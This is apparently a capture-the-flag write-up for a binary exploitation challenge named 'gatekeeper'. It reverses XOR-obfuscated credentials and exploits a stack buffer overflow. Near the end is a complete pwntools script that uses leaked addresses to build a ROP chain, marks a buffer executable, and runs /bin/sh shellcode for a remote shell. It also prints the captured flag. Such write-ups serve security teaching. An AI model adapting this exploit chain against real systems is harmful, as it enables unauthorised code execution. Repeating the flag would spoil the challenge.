<img width="570" height="612" alt="image" src="https://github.com/user-attachments/assets/a2d683e1-97b9-4546-80f2-1b69a540c931" />


#### Initial Analysis

We began by inspecting the directory contents and verifying the file type of `gatekeeper`.

<img width="1892" height="112" alt="image" src="https://github.com/user-attachments/assets/56b9eb67-b017-46e0-9a66-f3126b09161d" />


Checking security mitigations:

<img width="937" height="307" alt="image" src="https://github.com/user-attachments/assets/63620433-3e4a-4ccd-b708-73a671530ce8" />


**Key points:**

- No stack canary is present, which makes a buffer overflow via stack smashing highly viable.
- NX is enabled, so shellcode on the stack/heap is non-executable by default.
- PIE is enabled, so we will need to bypass address space layout randomization (ASLR) using leaked addresses.

---

#### Disassembly & Reverse Engineering

Inspecting the symbols list:

<img width="767" height="757" alt="image" src="https://github.com/user-attachments/assets/ff881242-e182-489d-a667-7932cea01659" />


<img width="686" height="777" alt="image" src="https://github.com/user-attachments/assets/568f4c62-dcf4-4687-88c5-4a4a1ca2f93d" />


We found several interesting functions and global variables:

- `gate`: credential validation logic.
- `xdec_u32`: XOR-based decryption function returning a 32-bit integer.
- `verify_archive`: integrity checking of an embedded `g_archive` structure.
- `enable_jit`: wraps `mprotect` to set a memory page's permission flags (read, write, execute).
- `vuln`: vulnerable read loop with buffer overflow.
- `gadgets`: explicitly contains pop-registers instructions.

#### Credential Bypassing (`gate`)

The `gate` function is defined as:

<img width="625" height="467" alt="image" src="https://github.com/user-attachments/assets/c60178c2-c7ca-4001-aaa7-d6fefb7af375" />


The program reads two 8-byte values and compares them (zero-extended) to the decrypted constants `k_m1` and `k_m2` decrypted via `xdec_u32`.
Reversing `xdec_u32` (which XORs each byte of the target with `0x5a`):

- `k_m1` = `0xe4e0a490` $\rightarrow$ `0xcafebabe`
- `k_m2` = `0xb5e4f784` $\rightarrow$ `0xdeadbeef`

So the credentials are:

1. `\xbe\xba\xfe\xca\x00\x00\x00\x00`
2. `\xef\xbe\xad\xde\x00\x00\x00\x00`

#### Buffer Overflow (`vuln`)

After successful authentication, the program prints out leaks:

```
[+] Gate token: <address of main>
[+] Stage buffer: <address of shellcode_buf>
```

It then reads our input into `shellcode_buf` and runs `filter_ok` to ensure it contains no null bytes, newlines, spaces, or slashes.
Finally, it calls `vuln()`:

<img width="557" height="352" alt="image" src="https://github.com/user-attachments/assets/00205e70-30c2-4f06-b460-6880cae3f5eb" />

`vuln` reads up to `0x200` bytes into a `0x40` byte buffer. This allows us to overwrite the saved `rbp` (at offset 64) and the return address (at offset 72) to control execution flow.

---

#### Exploit Construction

#### The Gadgets

The binary conveniently includes a `gadgets` function:

<img width="532" height="342" alt="image" src="https://github.com/user-attachments/assets/ccccbc13-86e0-480c-8b04-1860db5a9c1e" />


We have direct control over `rdi`, `rsi`, `rdx`, and `rax` using simple return-oriented programming (ROP) offsets relative to the binary base.

#### The Attack Plan

1. **Stage 1 (Credentials)**: Send `0xcafebabe` and `0xdeadbeef` to pass authentication.
2. **Stage 2 (Filter Bypass)**: Send dummy non-filtered bytes (e.g. `b"A"*8`) to pass `filter_ok` check on `shellcode_buf`.
3. **Stage 3 (ROP in `vuln`)**: Send a ROP chain to `vuln` that does the following:
    - Calls `enable_jit(shellcode_buf, 0x1000)` to make the stage buffer memory region executable (RX).
    - Calls `read(0, shellcode_buf, 0x200)` to read our actual shellcode into the now-executable buffer.
    - Jumps to `shellcode_buf` to execute the shellcode.
4. **Stage 4 (Shellcode)**: Send standard `/bin/sh` shellcode to trigger the shell.

---

#### Exploit Code (`exploit_remote.py`)

Below is the complete exploit code used:

```python
from pwn import *

# Context
context.arch = 'amd64'

# Connect to remote
p = remote("34.143.189.39", 10093)

# Receive banner
p.recvuntil(b"Supply credentials.\n")

# Send credentials
p.send(p64(0xcafebabe))
p.send(p64(0xdeadbeef))

# Read token and stage buffer leak
res1 = p.recvline().decode()
res2 = p.recvline().decode()

# Parse leaks
gate_token = int(res1.strip().split(": ")[1], 16)
stage_buffer = int(res2.strip().split(": ")[1], 16)

binary_base = gate_token - 0x5592

print(f"Base address: {binary_base:#x}")
print(f"Stage buffer: {stage_buffer:#x}")

# Gadgets
pop_rdi = binary_base + 0x5466
pop_rsi = binary_base + 0x5468
pop_rdx = binary_base + 0x546a
enable_jit = binary_base + 0x5471
read_plt = binary_base + 0x50d0

# Send stage 1 dummy shellcode (must pass filter)
p.send(b"A" * 8)
time.sleep(0.5)

# Build ROP chain
padding = b"B" * 72
rop = b""

# enable_jit(stage_buffer, 0x1000)
rop += p64(pop_rdi)
rop += p64(stage_buffer)
rop += p64(pop_rsi)
rop += p64(0x1000)
rop += p64(enable_jit)

# read(0, stage_buffer, 0x200)
rop += p64(pop_rdi)
rop += p64(0)
rop += p64(pop_rsi)
rop += p64(stage_buffer)
rop += p64(pop_rdx)
rop += p64(0x200)
rop += p64(read_plt)

# jump to stage_buffer
rop += p64(stage_buffer)

# Send ROP chain payload to vuln
p.send(padding + rop)
time.sleep(0.5)

# Send actual shellcode
shellcode = asm(shellcraft.sh())
p.send(shellcode)

# Interactive shell
p.interactive()
```

---

#### Execution & Flag Capture

Running the script results in a shell access on the remote system:

<img width="482" height="247" alt="image" src="https://github.com/user-attachments/assets/04914f10-a3b3-412d-9535-f3330f6da6c9" />

**Flag:**`HNYX{g4t3_l34k_fus3d_w1th_jit_mpr0t3ct}`
